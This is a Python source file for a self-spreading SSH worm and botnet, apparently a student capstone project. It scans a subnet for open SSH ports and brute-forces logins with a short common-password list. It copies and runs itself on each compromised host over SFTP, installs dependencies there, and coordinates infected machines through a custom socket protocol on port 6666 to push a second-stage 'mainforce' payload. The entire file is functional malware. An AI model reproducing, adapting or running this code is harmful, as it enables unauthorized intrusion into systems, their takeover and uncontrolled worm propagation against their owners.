import socket
from os import path, system
import threading
import fileinput
import paramiko

from addr import IADDR, INFECTED

SERVER_PORT = 6666
TARGET_HOST = '100.100.100.'
TARGET_PORT = 22
PARENT_FOLDER = '/tmp'
FOLDER_PATH = PARENT_FOLDER + '/capstone/'
FILE_NAME = 'test.py'
FILE_LOCATION = FOLDER_PATH + FILE_NAME
LIST_NAME = 'pl.txt'
LIST_LOCATION = FOLDER_PATH + LIST_NAME
ADDR_NAME = 'addr.py'
ADDR_LOCATION = FOLDER_PATH + ADDR_NAME
MAIN_FORCE_NAME = 'mainforce.py'
MAIN_FORCE_LOCATION = FOLDER_PATH + MAIN_FORCE_NAME
COMPRESS_FILE_NAME = 'capstone.tgz'
COMPRESS_LOCATION = PARENT_FOLDER + '/' + COMPRESS_FILE_NAME
COMPRESS_COMMAND = 'tar -zcf {0} -C {1} {2} {3} {4}'.format(COMPRESS_LOCATION, FOLDER_PATH, FILE_NAME, LIST_NAME,
                                                            ADDR_NAME)
REMOVE_COMPRESS_COMMAND = 'rm -f {0}'.format(COMPRESS_LOCATION)
DECOMPRESS_COMMAND = 'tar -zxf {0}/{1} -C {2}'.format(PARENT_FOLDER, COMPRESS_FILE_NAME, FOLDER_PATH)

INFECT_THRESHOLD = 1
MAIN_FORCE_REQUEST_BODY = 'mainforce'


def mylog(*args):
    with open(FOLDER_PATH + 'log.txt', 'a+') as f:
        s = ''
        for a in args:
            s += str(a) + ', '
        f.write('====>' + s + '\r\n')
    print '====>', args

def mydata(*args):
    with open(FOLDER_PATH + 'log.txt', 'a+') as f:
        s = ''
        for a in args:
            s += str(a) + ', '
        f.write('---->' + s + '\r\n')
    print '---->', args


def myerr(*args):
    print 'ERROR\n', args
    with open(FOLDER_PATH + 'log.txt', 'a+') as f:
        s = ''
        for a in args:
            s += str(a) + ', '
        f.write('ERROR!!!\r\n' + s + '\r\n')


class Host(object):
    def __init__(self, ip, infestor):
        self.infestor = infestor
        self.ip = ip
        self.username = ''
        self.password = ''
        self.count = 0

        self.ssh = None

    def attack(self):
        self.username = 'testuser'
        pws = ['123456', 'qwerty', 'test', 'password', 'iloveyou']
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for pw in pws:
            try:
                ssh.connect(self.ip, TARGET_PORT, self.username, pw)
                self.password = pw
            except paramiko.AuthenticationException:
                # print(pw, 'authentication exception')
                pass
        ssh.close()

    def connect(self):
        mylog('connect', self.ip, self.username, self.password)
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.ssh.connect(self.ip, TARGET_PORT, self.username, self.password)

    def send_main_force(self):
        sftp = self.ssh.open_sftp()
        sftp.put(MAIN_FORCE_LOCATION, MAIN_FORCE_LOCATION)
        mylog('N sends main force to {0}, N is {1}'.format(self.ip, self.infestor))
        stdout, stderr = self.exec_command_error('python {0}'.format(MAIN_FORCE_LOCATION))
        if len(stderr) > 0:
            mylog(stderr)
        self.ssh.close()

    def exec_command_error(self, command):
        _, stdout, stderr = self.ssh.exec_command(command)
        return stdout.readlines(), stderr.readlines()

    def infect(self):
        if not path.isfile(FILE_LOCATION):
            raise Exception('Source file {0} does not exist.'.format(FILE_LOCATION))

        if not self.ssh:
            self.attack()
            self.connect()

        sftp = self.ssh.open_sftp()
        stdout, stderr = self.exec_command_error('mkdir -p {0}'.format(FOLDER_PATH))
        if len(stderr) > 0:
            mylog('mkdir in', self.ip, stderr, '\n', stdout)
            return
        sftp.put(COMPRESS_LOCATION, COMPRESS_LOCATION)
        stdout, stderr = self.exec_command_error(DECOMPRESS_COMMAND)
        if len(stderr) > 0:
            mylog('decompress in', self.ip, stderr, '\n', stdout)
            return
        stdout, stderr = self.exec_command_error('pip install paramiko')
        if len(stderr) > 0:
            mylog('pip in', self.ip, stderr, '\n', stdout)
    #     t = threading.Thread(target=self.run_python)
    #     t.start()
    #
    # def run_python(self):
        stdout, stderr = self.exec_command_error('python {0} {1}'.format(FILE_LOCATION, self.infestor))
        if len(stderr) > 0:
            mylog('python in', self.ip, stderr, '\n', stdout)


class Infestor:
    def __init__(self):
        self.hosts = {}
        self.infected = []
        self.infestor_ip = ''
        self.infected_count = 0
        self.self_ip = self.get_local_ip()
        self.pl = self.get_pl()

    # def create_ip_file(self):
    def scan_host(self, hs, i):
        host = TARGET_HOST + str(i)
        try:
            s = socket.create_connection((host, TARGET_PORT), timeout=1)
            hs.append(host)
            s.close()
        except:
            pass

    # A
    def scan_hosts(self):
        hs = []
        threads = []

        for i in range(128, 150):
            t = threading.Thread(target=self.scan_host, args=(hs, i))
            threads.append(t)
        for th in threads:
            th.start()
        for th in threads:
            if th.isAlive():
                th.join()

        self.clean_addr(hs)

    def clean_addr(self, hs):
        hosts = set(self.infected)
        hosts.add(self.self_ip)
        mylog('infected and infestor IP: {0}, {1}'.format(self.infected, self.infestor_ip))
        for h in hs:
            if h not in self.infected:
                hosts.add(h)
                self.hosts[h] = Host(h, self.self_ip)
                break

        with open(ADDR_LOCATION) as f:
            mylog('before replace in addr:', f.readlines())

        lines = []
        for line in fileinput.input(ADDR_LOCATION, inplace=1):
            if 'IADDR' in line:
                line = "IADDR = '{0}'\n".format(self.self_ip)
            elif 'INFECTED' in line:
                line = 'INFECTED = {0}'.format(str(hosts))
            lines.append(line)
        out = file(ADDR_LOCATION, 'w')
        out.writelines(lines)

    def infect(self):
        mylog('A start infect')
        self.scan_hosts()

        if len(self.hosts) < 1:
            myerr('No hosts up.')

        with open(ADDR_LOCATION) as f:
            mylog('after replace in addr:', f.readlines())

        system(REMOVE_COMPRESS_COMMAND + ' | ' + COMPRESS_COMMAND)

        if len(self.hosts) > 0:
            for host in self.hosts:
                self.hosts[host].infect()

    def get_pl(self):
        with open(LIST_LOCATION, 'r+') as f:
            return f.read().splitlines()

    def get_local_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip

    # B
    def send_ips(self):
        mylog('B send ips to C')
        with open(LIST_LOCATION, 'r+') as f:
            for peer_ip in f.readlines():
                data = '{0},{1}'.format(self.infestor_ip, self.self_ip)
                c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                peer_addr = (peer_ip, SERVER_PORT)
                c.connect(peer_addr)
                try:
                    c.sendall(data)
                finally:
                    c.close()

    # C2A
    def send_infestor(self, ips):
        infestor, infected = ips
        mylog('C send infected ip to {0}'.format(infestor))
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        peer_addr = (infestor, SERVER_PORT)
        c.connect(peer_addr)
        try:
            c.sendall(infected)
        finally:
            c.close()

    # A2N
    def request_main_force(self):
        mylog('A sends the request to N: {0}'.format(self.infestor_ip))
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        peer_addr = (self.infestor_ip, SERVER_PORT)
        c.connect(peer_addr)
        try:
            c.sendall(MAIN_FORCE_REQUEST_BODY)
        finally:
            c.close()

    # A
    def get_mainforce(self, tar):
        mylog('A requests to get main force')
        # print tar, self.hosts
        if tar in self.hosts:
            self.infected_count += 1
            if self.infected_count >= INFECT_THRESHOLD:
                self.request_main_force()
        else:
            myerr('cannot find target infected machine')

    # N
    def send_main_force(self, tip):
        if tip in self.hosts:
            host = self.hosts[tip]
            host.send_main_force()
            del self.hosts[tip]

    # A,C,N
    def receive_ips(self):
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.bind((self.self_ip, SERVER_PORT))
        c.listen(128)
        mylog('A is waiting for data...')
        while True:
            connection, client = c.accept()
            client_addr, client_port = client
            try:
                mylog('connection from {0}:{1}'.format(client_addr, client_port))
                while True:
                    data = connection.recv(4096)
                    if data:
                        mydata(data)
                        if data == MAIN_FORCE_REQUEST_BODY:
                            mylog('receive ips as N')
                            # N
                            self.send_main_force(client_addr)
                        elif len(data.split(',')) == 2:
                            mylog('receive ips as C')
                            _, target_ip = data.split(',')
                            # C
                            if client_addr != target_ip:
                                myerr('sender\'s ip error')
                            else:
                                self.send_infestor(data.split(','))
                        else:
                            mylog('receive ips as A')
                            # A
                            if self.self_ip not in self.pl:
                                self.get_mainforce(data)
                            else:
                                mylog('already in the botnet')
                    else:
                        mylog('data ends')
                        break
            finally:
                mylog('connection ends: {0}'.format(client_addr))
                connection.close()

    # A
    def run(self):
        mylog('start')
        self.infestor_ip = IADDR
        self.infected = INFECTED

        if self.self_ip not in self.pl:
            mylog('not in botnet')
            self.send_ips()
        t = threading.Thread(target=self.receive_ips)
        t.start()
        self.infect()


if __name__ == '__main__':
    i = Infestor()
    i.run()
